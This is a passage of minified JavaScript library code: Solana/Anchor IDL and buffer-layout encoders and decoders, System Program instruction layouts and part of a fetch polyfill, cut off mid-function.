        i = n.slice(0, o);
      return lt.concat([lt.from(r.discriminator), i]);
    }
    decode(t, e = "hex") {
      "string" == typeof t &&
        (t = "hex" === e ? lt.from(t, "hex") : xl.decode(t));
      for (const [n, r] of this.ixLayouts) {
        const e = t.subarray(0, r.discriminator.length);
        if (e.equals(lt.from(r.discriminator)))
          return { name: n, data: r.layout.decode(t.subarray(e.length)) };
      }
      return null;
    }
    format(t, e) {
      return Op.format(t, e, this.idl);
    }
  }
  class Op {
    static format(t, e, n) {
      const r = n.instructions.find((e) => t.name === e.name);
      if (!r) return void 0, null;
      const o = r.args.map((e) => ({
          name: e.name,
          type: Op.formatIdlType(e.type),
          data: Op.formatIdlData(e, t.data[e.name], n.types),
        })),
        i = Op.flattenIdlAccounts(r.accounts);
      return {
        args: o,
        accounts: e.map((t, e) =>
          e < i.length ? { name: i[e].name, ...t } : { name: void 0, ...t }
        ),
      };
    }
    static formatIdlType(t) {
      if ("string" == typeof t) return t;
      if ("option" in t) return `Option<${this.formatIdlType(t.option)}>`;
      if ("coption" in t) return `COption<${this.formatIdlType(t.coption)}>`;
      if ("vec" in t) return `Vec<${this.formatIdlType(t.vec)}>`;
      if ("array" in t) return `Array<${t.array[0]}; ${t.array[1]}>`;
      if ("defined" in t) {
        const e = t.defined.name;
        if (t.defined.generics) {
          return `${e}<${t.defined.generics
            .map((t) => {
              switch (t.kind) {
                case "type":
                  return Op.formatIdlType(t.type);
                case "const":
                  return t.value;
              }
            })
            .join(", ")}>`;
        }
        return e;
      }
      throw new Error(`Unknown IDL type: ${t}`);
    }
    static formatIdlData(t, e, n) {
      if ("string" == typeof t.type) return e.toString();
      if ("vec" in t.type)
        return (
          "[" +
          e
            .map((e) =>
              this.formatIdlData({ name: "", type: t.type.vec }, e, n)
            )
            .join(", ") +
          "]"
        );
      if ("option" in t.type)
        return null === e
          ? "null"
          : this.formatIdlData({ name: "", type: t.type.option }, e, n);
      if ("defined" in t.type) {
        if (!n) throw new Error("User defined types not provided");
        const r = t.type.defined.name,
          o = n.find((t) => t.name === r);
        if (!o) throw new Error(`Type not found: ${r}`);
        return Op.formatIdlDataDefined(o, e, n);
      }
      return "unknown";
    }
    static formatIdlDataDefined(t, e, n) {
      switch (t.type.kind) {
        case "struct":
          return (
            "{ " +
            mf(
              t.type.fields,
              () => "",
              (t) =>
                Object.entries(e)
                  .map(([e, r]) => {
                    const o = t.find((t) => t.name === e);
                    if (!o) throw new Error(`Field not found: ${e}`);
                    return e + ": " + Op.formatIdlData(o, r, n);
                  })
                  .join(", "),
              (t) =>
                Object.entries(e)
                  .map(
                    ([e, r]) =>
                      e +
                      ": " +
                      Op.formatIdlData({ name: "", type: t[e] }, r, n)
                  )
                  .join(", ")
            ) +
            " }"
          );
        case "enum": {
          const r = Object.keys(e)[0],
            o = t.type.variants.find((t) => t.name === r);
          if (!o) throw new Error(`Unable to find variant: ${r}`);
          const i = e[r];
          return mf(
            o.fields,
            () => r,
            (t) => {
              const e = Object.keys(i)
                .map((e) => {
                  const r = i[e],
                    o = t.find((t) => t.name === e);
                  if (!o) throw new Error(`Field not found: ${e}`);
                  return e + ": " + Op.formatIdlData(o, r, n);
                })
                .join(", ");
              return `${r} { ${e} }`;
            },
            (t) => {
              const e = Object.entries(i)
                .map(
                  ([e, r]) =>
                    e + ": " + Op.formatIdlData({ name: "", type: t[e] }, r, n)
                )
                .join(", ");
              return `${r} { ${e} }`;
            }
          );
        }
        case "type":
          return Op.formatIdlType(t.type.alias);
      }
    }
    static flattenIdlAccounts(t, e) {
      return t
        .map((t) => {
          const n = (function (t) {
            const e = t.replace(/([A-Z])/g, " $1");
            return e.charAt(0).toUpperCase() + e.slice(1);
          })(t.name);
          if (t.hasOwnProperty("accounts")) {
            const r = e ? `${e} > ${n}` : n;
            return Op.flattenIdlAccounts(t.accounts, r);
          }
          return { ...t, name: e ? `${e} > ${n}` : n };
        })
        .flat();
    }
  }
  class Mp {
    constructor(t) {
      if (((this.idl = t), !t.accounts))
        return (this.accountLayouts = new Map()), void 0;
      const e = t.types;
      if (!e) throw new Error("Accounts require `idl.types`");
      const n = t.accounts.map((t) => {
        const n = e.find((e) => e.name === t.name);
        if (!n) throw new Error(`Account not found: ${t.name}`);
        return [
          t.name,
          {
            discriminator: t.discriminator,
            layout: Pp.typeDefLayout({ typeDef: n, types: e }),
          },
        ];
      });
      this.accountLayouts = new Map(n);
    }
    async encode(t, e) {
      const n = lt.alloc(1e3),
        r = this.accountLayouts.get(t);
      if (!r) throw new Error(`Unknown account: ${t}`);
      const o = r.layout.encode(e, n),
        i = n.slice(0, o),
        s = this.accountDiscriminator(t);
      return lt.concat([s, i]);
    }
    decode(t, e) {
      const n = this.accountDiscriminator(t);
      if (n.compare(e.slice(0, n.length)))
        throw new Error("Invalid account discriminator");
      return this.decodeUnchecked(t, e);
    }
    decodeAny(t) {
      for (const [e, n] of this.accountLayouts) {
        if (
          t.subarray(0, n.discriminator.length).equals(lt.from(n.discriminator))
        )
          return this.decodeUnchecked(e, t);
      }
      throw new Error("Account not found");
    }
    decodeUnchecked(t, e) {
      const n = this.accountDiscriminator(t),
        r = e.subarray(n.length),
        o = this.accountLayouts.get(t);
      if (!o) throw new Error(`Unknown account: ${t}`);
      return o.layout.decode(r);
    }
    memcmp(t, e) {
      const n = this.accountDiscriminator(t);
      return { offset: 0, bytes: xl.encode(e ? lt.concat([n, e]) : n) };
    }
    size(t) {
      return (
        this.accountDiscriminator(t).length +
        Pp.typeSize({ defined: { name: t } }, this.idl)
      );
    }
    accountDiscriminator(t) {
      var e;
      const n =
        null === (e = this.idl.accounts) || void 0 === e
          ? void 0
          : e.find((e) => e.name === t);
      if (!n) throw new Error(`Account not found: ${t}`);
      return lt.from(n.discriminator);
    }
  }
  class Lp {
    constructor(t) {
      if (!t.events) return (this.layouts = new Map()), void 0;
      const e = t.types;
      if (!e) throw new Error("Events require `idl.types`");
      const n = t.events.map((t) => {
        const n = e.find((e) => e.name === t.name);
        if (!n) throw new Error(`Event not found: ${t.name}`);
        return [
          t.name,
          {
            discriminator: t.discriminator,
            layout: Pp.typeDefLayout({ typeDef: n, types: e }),
          },
        ];
      });
      this.layouts = new Map(n);
    }
    decode(t) {
      let e;
      try {
        e = ff(t);
      } catch (n) {
        return null;
      }
      for (const [r, o] of this.layouts) {
        const t = e.subarray(0, o.discriminator.length);
        if (t.equals(lt.from(o.discriminator)))
          return { name: r, data: o.layout.decode(e.subarray(t.length)) };
      }
      return null;
    }
  }
  class Np {
    constructor(t) {
      const e = t.types;
      if (!e) return (this.typeLayouts = new Map()), void 0;
      const n = e
        .filter((t) => !t.generics)
        .map((t) => [t.name, Pp.typeDefLayout({ typeDef: t, types: e })]);
      this.typeLayouts = new Map(n);
    }
    encode(t, e) {
      const n = lt.alloc(1e3),
        r = this.typeLayouts.get(t);
      if (!r) throw new Error(`Unknown type: ${t}`);
      const o = r.encode(e, n);
      return n.slice(0, o);
    }
    decode(t, e) {
      const n = this.typeLayouts.get(t);
      if (!n) throw new Error(`Unknown type: ${t}`);
      return n.decode(e);
    }
  }
  class Dp {
    constructor(t) {
      (this.instruction = new Rp(t)),
        (this.accounts = new Mp(t)),
        (this.events = new Lp(t)),
        (this.types = new Np(t));
    }
  }
  class Up {
    constructor(t, e) {
      if (!Number.isInteger(t)) throw new TypeError("span must be an integer");
      (this.span = t), (this.property = e);
    }
    makeDestinationObject() {
      return {};
    }
    decode(t, e) {
      throw new Error("Layout is abstract");
    }
    encode(t, e, n) {
      throw new Error("Layout is abstract");
    }
    getSpan(t, e) {
      if (0 > this.span) throw new RangeError("indeterminate span");
      return this.span;
    }
    replicate(t) {
      const e = Object.create(this.constructor.prototype);
      return Object.assign(e, this), (e.property = t), e;
    }
    fromArray(t) {}
  }
  var qp = Up;
  class Wp extends Up {
    isCount() {
      throw new Error("ExternalLayout is abstract");
    }
  }
  class zp extends Wp {
    constructor(t, e, n) {
      if (!(t instanceof Up)) throw new TypeError("layout must be a Layout");
      if (void 0 === e) e = 0;
      else if (!Number.isInteger(e))
        throw new TypeError("offset must be integer or undefined");
      super(t.span, n || t.property), (this.layout = t), (this.offset = e);
    }
    isCount() {
      return this.layout instanceof Kp || this.layout instanceof Fp;
    }
    decode(t, e) {
      return void 0 === e && (e = 0), this.layout.decode(t, e + this.offset);
    }
    encode(t, e, n) {
      return void 0 === n && (n = 0), this.layout.encode(t, e, n + this.offset);
    }
  }
  class Kp extends Up {
    constructor(t, e) {
      if ((super(t, e), 6 < this.span))
        throw new RangeError("span must not exceed 6 bytes");
    }
    decode(t, e) {
      return void 0 === e && (e = 0), t.readUIntLE(e, this.span);
    }
    encode(t, e, n) {
      return void 0 === n && (n = 0), e.writeUIntLE(t, n, this.span), this.span;
    }
  }
  class Fp extends Up {
    constructor(t, e) {
      if ((super(t, e), 6 < this.span))
        throw new RangeError("span must not exceed 6 bytes");
    }
    decode(t, e) {
      return void 0 === e && (e = 0), t.readUIntBE(e, this.span);
    }
    encode(t, e, n) {
      return void 0 === n && (n = 0), e.writeUIntBE(t, n, this.span), this.span;
    }
  }
  const jp = Math.pow(2, 32);
  function Gp(t) {
    const e = Math.floor(t / jp);
    return { hi32: e, lo32: t - e * jp };
  }
  function Vp(t, e) {
    return t * jp + e;
  }
  class Hp extends Up {
    constructor(t) {
      super(8, t);
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      const n = t.readUInt32LE(e);
      return Vp(t.readUInt32LE(e + 4), n);
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = Gp(t);
      return e.writeUInt32LE(r.lo32, n), e.writeUInt32LE(r.hi32, n + 4), 8;
    }
  }
  class Xp extends Up {
    constructor(t) {
      super(8, t);
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      const n = t.readUInt32LE(e);
      return Vp(t.readInt32LE(e + 4), n);
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = Gp(t);
      return e.writeUInt32LE(r.lo32, n), e.writeInt32LE(r.hi32, n + 4), 8;
    }
  }
  class Zp extends Up {
    constructor(t, e, n) {
      if (!Array.isArray(t) || !t.reduce((t, e) => t && e instanceof Up, !0))
        throw new TypeError("fields must be array of Layout instances");
      "boolean" == typeof e && void 0 === n && ((n = e), (e = void 0));
      for (const i of t)
        if (0 > i.span && void 0 === i.property)
          throw new Error(
            "fields cannot contain unnamed variable-length layout"
          );
      let r = -1;
      try {
        r = t.reduce((t, e) => t + e.getSpan(), 0);
      } catch (o) {}
      super(r, e), (this.fields = t), (this.decodePrefixes = !!n);
    }
    getSpan(t, e) {
      if (0 <= this.span) return this.span;
      void 0 === e && (e = 0);
      let n = 0;
      try {
        n = this.fields.reduce((n, r) => {
          const o = r.getSpan(t, e);
          return (e += o), n + o;
        }, 0);
      } catch (r) {
        throw new RangeError("indeterminate span");
      }
      return n;
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      const n = this.makeDestinationObject();
      for (const r of this.fields)
        if (
          (void 0 !== r.property && (n[r.property] = r.decode(t, e)),
          (e += r.getSpan(t, e)),
          this.decodePrefixes && t.length === e)
        )
          break;
      return n;
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = n;
      let o = 0,
        i = 0;
      for (const s of this.fields) {
        let r = s.span;
        if (((i = 0 < r ? r : 0), void 0 !== s.property)) {
          const o = t[s.property];
          void 0 !== o &&
            ((i = s.encode(o, e, n)), 0 > r && (r = s.getSpan(e, n)));
        }
        (o = n), (n += r);
      }
      return o + i - r;
    }
    fromArray(t) {
      const e = this.makeDestinationObject();
      for (const n of this.fields)
        void 0 !== n.property && 0 < t.length && (e[n.property] = t.shift());
      return e;
    }
    layoutFor(t) {
      if ("string" != typeof t) throw new TypeError("property must be string");
      for (const e of this.fields) if (e.property === t) return e;
    }
    offsetOf(t) {
      if ("string" != typeof t) throw new TypeError("property must be string");
      let e = 0;
      for (const n of this.fields) {
        if (n.property === t) return e;
        0 > n.span ? (e = -1) : 0 <= e && (e += n.span);
      }
    }
  }
  class Jp {
    constructor(t) {
      this.property = t;
    }
    decode() {
      throw new Error("UnionDiscriminator is abstract");
    }
    encode() {
      throw new Error("UnionDiscriminator is abstract");
    }
  }
  class Yp extends Jp {
    constructor(t, e) {
      if (!(t instanceof Wp && t.isCount()))
        throw new TypeError(
          "layout must be an unsigned integer ExternalLayout"
        );
      super(e || t.property || "variant"), (this.layout = t);
    }
    decode(t, e) {
      return this.layout.decode(t, e);
    }
    encode(t, e, n) {
      return this.layout.encode(t, e, n);
    }
  }
  class Qp extends Up {
    constructor(t, e, n) {
      const r = t instanceof Kp || t instanceof Fp;
      if (r) t = new Yp(new zp(t));
      else if (t instanceof Wp && t.isCount()) t = new Yp(t);
      else if (!(t instanceof Jp))
        throw new TypeError(
          "discr must be a UnionDiscriminator or an unsigned integer layout"
        );
      if ((void 0 === e && (e = null), !(null === e || e instanceof Up)))
        throw new TypeError("defaultLayout must be null or a Layout");
      if (null !== e) {
        if (0 > e.span)
          throw new Error("defaultLayout must have constant span");
        void 0 === e.property && (e = e.replicate("content"));
      }
      let o = -1;
      e && ((o = e.span), 0 <= o && r && (o += t.layout.span)),
        super(o, n),
        (this.discriminator = t),
        (this.usesPrefixDiscriminator = r),
        (this.defaultLayout = e),
        (this.registry = {});
      let i = this.defaultGetSourceVariant.bind(this);
      (this.getSourceVariant = function (t) {
        return i(t);
      }),
        (this.configGetSourceVariant = function (t) {
          i = t.bind(this);
        });
    }
    getSpan(t, e) {
      if (0 <= this.span) return this.span;
      void 0 === e && (e = 0);
      const n = this.getVariant(t, e);
      if (!n)
        throw new Error("unable to determine span for unrecognized variant");
      return n.getSpan(t, e);
    }
    defaultGetSourceVariant(t) {
      if (t.hasOwnProperty(this.discriminator.property)) {
        if (this.defaultLayout && t.hasOwnProperty(this.defaultLayout.property))
          return;
        const e = this.registry[t[this.discriminator.property]];
        if (e && (!e.layout || t.hasOwnProperty(e.property))) return e;
      } else
        for (const e in this.registry) {
          const n = this.registry[e];
          if (t.hasOwnProperty(n.property)) return n;
        }
      throw new Error("unable to infer src variant");
    }
    decode(t, e) {
      let n;
      void 0 === e && (e = 0);
      const r = this.discriminator,
        o = r.decode(t, e);
      let i = this.registry[o];
      if (void 0 === i) {
        let s = 0;
        (i = this.defaultLayout),
          this.usesPrefixDiscriminator && (s = r.layout.span),
          (n = this.makeDestinationObject()),
          (n[r.property] = o),
          (n[i.property] = this.defaultLayout.decode(t, e + s));
      } else n = i.decode(t, e);
      return n;
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      const r = this.getSourceVariant(t);
      if (void 0 === r) {
        const r = this.discriminator,
          o = this.defaultLayout;
        let i = 0;
        return (
          this.usesPrefixDiscriminator && (i = r.layout.span),
          r.encode(t[r.property], e, n),
          i + o.encode(t[o.property], e, n + i)
        );
      }
      return r.encode(t, e, n);
    }
    addVariant(t, e, n) {
      const r = new $p(this, t, e, n);
      return (this.registry[t] = r), r;
    }
    getVariant(t, e) {
      let n = t;
      return (
        ct.isBuffer(t) &&
          (void 0 === e && (e = 0), (n = this.discriminator.decode(t, e))),
        this.registry[n]
      );
    }
  }
  class $p extends Up {
    constructor(t, e, n, r) {
      if (!(t instanceof Qp)) throw new TypeError("union must be a Union");
      if (!Number.isInteger(e) || 0 > e)
        throw new TypeError("variant must be a (non-negative) integer");
      if (("string" == typeof n && void 0 === r && ((r = n), (n = null)), n)) {
        if (!(n instanceof Up)) throw new TypeError("layout must be a Layout");
        if (
          null !== t.defaultLayout &&
          0 <= n.span &&
          n.span > t.defaultLayout.span
        )
          throw new Error("variant span exceeds span of containing union");
        if ("string" != typeof r)
          throw new TypeError("variant must have a String property");
      }
      let o = t.span;
      0 > t.span &&
        ((o = n ? n.span : 0),
        0 <= o &&
          t.usesPrefixDiscriminator &&
          (o += t.discriminator.layout.span)),
        super(o, r),
        (this.union = t),
        (this.variant = e),
        (this.layout = n || null);
    }
    getSpan(t, e) {
      if (0 <= this.span) return this.span;
      void 0 === e && (e = 0);
      let n = 0;
      return (
        this.union.usesPrefixDiscriminator &&
          (n = this.union.discriminator.layout.span),
        n + this.layout.getSpan(t, e + n)
      );
    }
    decode(t, e) {
      const n = this.makeDestinationObject();
      if ((void 0 === e && (e = 0), this !== this.union.getVariant(t, e)))
        throw new Error("variant mismatch");
      let r = 0;
      return (
        this.union.usesPrefixDiscriminator &&
          (r = this.union.discriminator.layout.span),
        this.layout
          ? (n[this.property] = this.layout.decode(t, e + r))
          : this.property
          ? (n[this.property] = !0)
          : this.union.usesPrefixDiscriminator &&
            (n[this.union.discriminator.property] = this.variant),
        n
      );
    }
    encode(t, e, n) {
      void 0 === n && (n = 0);
      let r = 0;
      if (
        (this.union.usesPrefixDiscriminator &&
          (r = this.union.discriminator.layout.span),
        this.layout && !t.hasOwnProperty(this.property))
      )
        throw new TypeError("variant lacks property " + this.property);
      this.union.discriminator.encode(this.variant, e, n);
      let o = r;
      if (
        this.layout &&
        (this.layout.encode(t[this.property], e, n + r),
        (o += this.layout.getSpan(e, n + r)),
        0 <= this.union.span && o > this.union.span)
      )
        throw new Error("encoded variant overruns containing union");
      return o;
    }
    fromArray(t) {
      if (this.layout) return this.layout.fromArray(t);
    }
  }
  let tm = class extends Up {
    constructor(t, e) {
      if (
        !((t instanceof Wp && t.isCount()) || (Number.isInteger(t) && 0 <= t))
      )
        throw new TypeError(
          "length must be positive integer or an unsigned integer ExternalLayout"
        );
      let n = -1;
      t instanceof Wp || (n = t), super(n, e), (this.length = t);
    }
    getSpan(t, e) {
      let n = this.span;
      return 0 > n && (n = this.length.decode(t, e)), n;
    }
    decode(t, e) {
      void 0 === e && (e = 0);
      let n = this.span;
      return 0 > n && (n = this.length.decode(t, e)), t.slice(e, e + n);
    }
    encode(t, e, n) {
      let r = this.length;
      if (
        (this.length instanceof Wp && (r = t.length),
        !ct.isBuffer(t) || r !== t.length)
      )
        throw new TypeError(
          ((o = "Blob.encode"),
          ((i = this).property ? o + "[" + i.property + "]" : o) +
            " requires (length " +
            r +
            ") Buffer as src")
        );
      var o, i;
      if (n + r > e.length) throw new RangeError("encoding overruns Buffer");
      return (
        e.write(t.toString("hex"), n, r, "hex"),
        this.length instanceof Wp && this.length.encode(r, e, n),
        r
      );
    }
  };
  var em = (t, e, n) => new zp(t, e, n),
    nm = (t) => new Kp(4, t),
    rm = (t) => new Xp(t),
    om = (t, e, n) => new Zp(t, e, n),
    im = (t, e, n) => new Qp(t, e, n),
    sm = (t, e) => new tm(t, e);
  class am extends qp {
    constructor(t) {
      super(-1, t),
        (this.property = t),
        (this.layout = om(
          [nm("length"), nm("lengthPadding"), sm(em(nm(), -8), "chars")],
          this.property
        ));
    }
    encode(t, e, n = 0) {
      if (null == t) return this.layout.span;
      const r = { chars: ct.from(t, "utf8") };
      return this.layout.encode(r, e, n);
    }
    decode(t, e = 0) {
      return this.layout.decode(t, e).chars.toString();
    }
    getSpan(t, e = 0) {
      return (
        nm().span +
        nm().span +
        new Zn(new Uint8Array(t).slice(e, e + 4), 10, "le").toNumber()
      );
    }
  }
  function um(t) {
    return new am(t);
  }
  function cm(t) {
    return sm(32, t);
  }
  const lm = im(nm("instruction"));
  lm.addVariant(
    0,
    om([rm("lamports"), rm("space"), cm("owner")]),
    "createAccount"
  ),
    lm.addVariant(1, om([cm("owner")]), "assign"),
    lm.addVariant(2, om([rm("lamports")]), "transfer"),
    lm.addVariant(
      3,
      om([cm("base"), um("seed"), rm("lamports"), rm("space"), cm("owner")]),
      "createAccountWithSeed"
    ),
    lm.addVariant(4, om([cm("authorized")]), "advanceNonceAccount"),
    lm.addVariant(5, om([rm("lamports")]), "withdrawNonceAccount"),
    lm.addVariant(6, om([cm("authorized")]), "initializeNonceAccount"),
    lm.addVariant(7, om([cm("authorized")]), "authorizeNonceAccount"),
    lm.addVariant(8, om([rm("space")]), "allocate"),
    lm.addVariant(
      9,
      om([cm("base"), um("seed"), rm("space"), cm("owner")]),
      "allocateWithSeed"
    ),
    lm.addVariant(
      10,
      om([cm("base"), um("seed"), cm("owner")]),
      "assignWithSeed"
    ),
    lm.addVariant(
      11,
      om([rm("lamports"), um("seed"), cm("owner")]),
      "transferWithSeed"
    ),
    Math.max(...Object.values(lm.registry).map((t) => t.span));
  class dm extends qp {
    constructor(t, e, n, r) {
      super(t.span, r),
        (this.layout = t),
        (this.decoder = e),
        (this.encoder = n);
    }
    decode(t, e) {
      return this.decoder(this.layout.decode(t, e));
    }
    encode(t, e, n) {
      return this.layout.encode(this.encoder(t), e, n);
    }
    getSpan(t, e) {
      return this.layout.getSpan(t, e);
    }
  }
  function fm(t) {
    return new dm(
      sm(32),
      (t) => new Xi(t),
      (t) => t.toBuffer(),
      t
    );
  }
  var hm;
  om([
    nm("version"),
    nm("state"),
    fm("authorizedPubkey"),
    fm("nonce"),
    om([((hm = "lamportsPerSignature"), new Hp(hm))], "feeCalculator"),
  ]),
    new Xi("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    new Xi("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
  var pm = { exports: {} };
  !(function (t, e) {
    var n,
      r = "undefined" != typeof self ? self : Yf,
      o = (function () {
        function t() {
          (this.fetch = !1), (this.DOMException = r.DOMException);
        }
        return (t.prototype = r), new t();
      })();
    (n = o),
      void !(function (t) {
        var e = "URLSearchParams" in n,
          r = "Symbol" in n && "iterator" in Symbol,
          o =
            "FileReader" in n &&
            "Blob" in n &&
            (function () {
              try {
                return new Blob(), !0;
              } catch (t) {
                return !1;
              }
            })(),
          i = "FormData" in n,
          s = "ArrayBuffer" in n;
        if (s)
          var a = [
              "[object Int8Array]",
              "[object Uint8Array]",
              "[object Uint8ClampedArray]",
              "[object Int16Array]",
              "[object Uint16Array]",
              "[object Int32Array]",
              "[object Uint32Array]",
              "[object Float32Array]",
              "[object Float64Array]",
            ],
            u =
              ArrayBuffer.isView ||
              function (t) {
                return t && a.indexOf(Object.prototype.toString.call(t)) > -1;
              };
        function c(t) {
          if (
            ("string" != typeof t && (t = String(t)),
            /[^a-z0-9\-#$%&'*+.^_`|~]/i.test(t))
          )
            throw new TypeError("Invalid character in header field name");
          return t.toLowerCase();
        }
        function l(t) {
          return "string" != typeof t && (t = String(t)), t;
        }
        function d(t) {
          var e = {
            next: function () {
              var e = t.shift();
              return { done: void 0 === e, value: e };
            },
          };
          return (
            r &&
              (e[Symbol.iterator] = function () {
                return e;
              }),
            e
          );
        }
        function f(t) {
          (this.map = {}),
            t instanceof f
              ? t.forEach(function (t, e) {
                  this.append(e, t);
                }, this)
              : Array.isArray(t)
              ? t.forEach(function (t) {
                  this.append(t[0], t[1]);
                }, this)
              : t &&
                Object.getOwnPropertyNames(t).forEach(function (e) {
                  this.append(e, t[e]);
                }, this);
        }
        function h(t) {
          if (t.bodyUsed) return Promise.reject(new TypeError("Already read"));
          t.bodyUsed = !0;
        }
        function p(t) {
          return new Promise(function (e, n) {
            (t.onload = function () {
              e(t.result);
            }),
              (t.onerror = function () {
                n(t.error);
              });
          });
        }
        function m(t) {
          var e = new FileReader(),
            n = p(e);
          return e.readAsArrayBuffer(t), n;
        }
        function g(t) {
          if (t.slice) return t.slice(0);
          var e = new Uint8Array(t.byteLength);
          return e.set(new Uint8Array(t)), e.buffer;
        }
        function y() {
          return (
            (this.bodyUsed = !1),
            (this._initBody = function (t) {
              var n;
              (this._bodyInit = t),
                t
                  ? "string" == typeof t
                    ? (this._bodyText = t)
                    : o && Blob.prototype.isPrototypeOf(t)
                    ? (this._bodyBlob = t)
                    : i && FormData.prototype.isPrototypeOf(t)
                    ? (this._bodyFormData = t)
                    : e && URLSearchParams.prototype.isPrototypeOf(t)
                    ? (this._bodyText = t.toString())
                    : s && o && (n = t) && DataView.prototype.isPrototypeOf(n)
                    ? ((this._bodyArrayBuffer = g(t.buffer)),
                      (this._bodyInit = new Blob([this._bodyArrayBuffer])))
                    : s && (ArrayBuffer.prototype.isPrototypeOf(t) || u(t))
                    ? (this._bodyArrayBuffer = g(t))
                    : (this._bodyText = t = Object.prototype.toString.call(t))
                  : (this._bodyText = ""),
                this.headers.get("content-type") ||
                  ("string" == typeof t
                    ? this.headers.set(
                        "content-type",
                        "text/plain;charset=UTF-8"
                      )
                    : this._bodyBlob && this._bodyBlob.type
                    ? this.headers.set("content-type", this._bodyBlob.type)
                    : e &&
                      URLSearchParams.prototype.isPrototypeOf(t) &&
                      this.headers.set(
                        "content-type",
                        "application/x-www-form-urlencoded;charset=UTF-8"
                      ));
            }),
            o &&
              ((this.blob = function () {
                var t = h(this);
                if (t) return t;
                if (this._bodyBlob) return Promise.resolve(this._bodyBlob);
                if (this._bodyArrayBuffer)
                  return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                if (this._bodyFormData)
                  throw new Error("could not read FormData body as blob");
                return Promise.resolve(new Blob([this._bodyText]));
              }),
              (this.arrayBuffer = function () {
                return this._bodyArrayBuffer
                  ? h(this) || Promise.resolve(this._bodyArrayBuffer)
                  : this.blob().then(m);
              })),
            (this.text = function () {
              var t,
                e,
                n,
                r = h(this);
              if (r) return r;
              if (this._bodyBlob)
                return (
                  (t = this._bodyBlob),
                  (e = new FileReader()),
                  (n = p(e)),
                  e.readAsText(t),
                  n
                );
              if (this._bodyArrayBuffer)
                return Promise.resolve(
                  (function (t) {
                    for (
                      var e = new Uint8Array(t), n = new Array(e.length), r = 0;
                      r < e.length;
                      r++
                    )
                      n[r] = String.fromCharCode(e[r]);
                    return n.join("");
                  })(this._bodyArrayBuffer)
                );
              if (this._bodyFormData)
                throw new Error("could not read FormData body as text");
              return Promise.resolve(this._bodyText);
            }),
            i &&
              (this.formData = function () {
                return this.text().then(v);
              }),
            (this.json = function () {
              return this.text().then(JSON.parse);
            }),
            this
          );
        }
        (f.prototype.append = function (t, e) {
          (t = c(t)), (e = l(e));
          var n = this.map[t];
          this.map[t] = n ? n + ", " + e : e;
        }),
          (f.prototype.delete = function (t) {
            delete this.map[c(t)];
          }),
          (f.prototype.get = function (t) {
            return (t = c(t)), this.has(t) ? this.map[t] : null;
          }),
          (f.prototype.has = function (t) {
            return this.map.hasOwnProperty(c(t));
          }),
          (f.prototype.set = function (t, e) {
            this.map[c(t)] = l(e);
          }),
          (f.prototype.forEach = function (t, e) {
            for (var n in this.map)
              this.map.hasOwnProperty(n) && t.call(e, this.map[n], n, this);
          }),
          (f.prototype.keys = function () {
            var t = [];
            return (
              this.forEach(function (e, n) {
                t.push(n);
              }),
              d(t)
            );
          }),
          (f.prototype.values = function () {
            var t = [];
            return (
              this.forEach(function (e) {
                t.push(e);
              }),
              d(t)
            );
          }),
          (f.prototype.entries = function () {
            var t = [];
            return (
              this.forEach(function (e, n) {
                t.push([n, e]);
              }),
              d(t)
            );
          }),
          r && (f.prototype[Symbol.iterator] = f.prototype.entries);
        var w = ["DELETE", "GET", "HEAD", "OPTIONS", "POST", "PUT"];
        function b(t, e) {
          var n,
            r,
            o = (e = e || {}).body;
          if (t instanceof b) {
            if (t.bodyUsed) throw new TypeError("Already read");
            (this.url = t.url),
              (this.credentials = t.credentials),
              e.headers || (this.headers = new f(t.headers)),
              (this.method = t.method),
              (this.mode = t.mode),
              (this.signal = t.signal),
              o ||
                null == t._bodyInit ||
                ((o = t._bodyInit), (t.bodyUsed = !0));
          } else this.url = String(t);
          if (
            ((this.credentials =
              e.credentials || this.credentials || "same-origin"),
            (!e.headers && this.headers) || (this.headers = new f(e.headers)),
            (this.method =
              ((n = e.method || this.method || "GET"),
              (r = n.toUpperCase()),
              w.indexOf(r) > -1 ? r : n)),
            (this.mode = e.mode || this.mode || null),
            (this.signal = e.signal || this.signal),
            (this.referrer = null),
            ("GET" === this.method || "HEAD" === this.method) && o)
          )
            throw new TypeError("Body not allowed for GET or HEAD requests");
          this._initBody(o);
        }
        function v(t) {
          var e = new FormData();
          return (
            t
              .trim()
              .split("&")
              .forEach(function (t) {
                if (t) {
                  var n = t.split("="),
                    r = n.shift().replace(/\+/g, " "),
                    o = n.join("=").replace(/\+/g, " ");
                  e.append(decodeURIComponent(r), decodeURIComponent(o));
                }
              }),
            e
          );
        }
        function A(t, e) {
          e || (e = {}),
            (this.type = "default"),
            (this.status = void 0 === e.status ? 200 : e.status),
            (this.ok = this.status >= 200 && this.status < 300),
            (this.statusText = "statusText" in e ? e.statusText : "OK"),
            (this.headers = new f(e.headers)),
            (this.url = e.url || ""),
            this._initBody(t);
        }
        (b.prototype.clone = function () {
          return new b(this, { body: this._bodyInit });
        }),
          y.call(b.prototype),
          y.call(A.prototype),
          (A.prototype.clone = function () {
            return new A(this._bodyInit, {
              status: this.status,
              statusText: this.statusText,
              headers: new f(this.headers),
              url: this.url,
            });
          }),
          (A.error = function () {
            var t = new A(null, { status: 0, statusText: "" });
            return (t.type = "error"), t;
          });
        var k = [301, 302, 303, 307, 308];
        (A.redirect = function (t, e) {
          if (-1 === k.indexOf(e)) throw new RangeError("Invalid status code");
          return new A(null, { status: e, headers: { location: t } });
        }),
          (t.DOMException = n.DOMException);
        try {
          new t.DOMException();
        } catch (S) {
          (t.DOMException = function (t, e) {
            (this.message = t), (this.name = e);
            var n = Error(t);
            this.stack = n.stack;
          }),
            (t.DOMException.prototype = Object.create(Error.prototype)),
            (t.DOMException.prototype.constructor = t.DOMException);
        }
        function I(e, n) {
          return new Promise(function (r, i) {
            var s = new b(e, n);
            if (s.signal && s.signal.aborted)
              return i(new t.DOMException("Aborted", "AbortError"));
            var a = new XMLHttpRequest();
            function u() {
              a.abort();
            }
            (a.onload = function () {
              var t,
                e,
                n = {
                  status: a.status,
                  statusText: a.statusText,
                  headers:
                    ((t = a.getAllResponseHeaders() || ""),
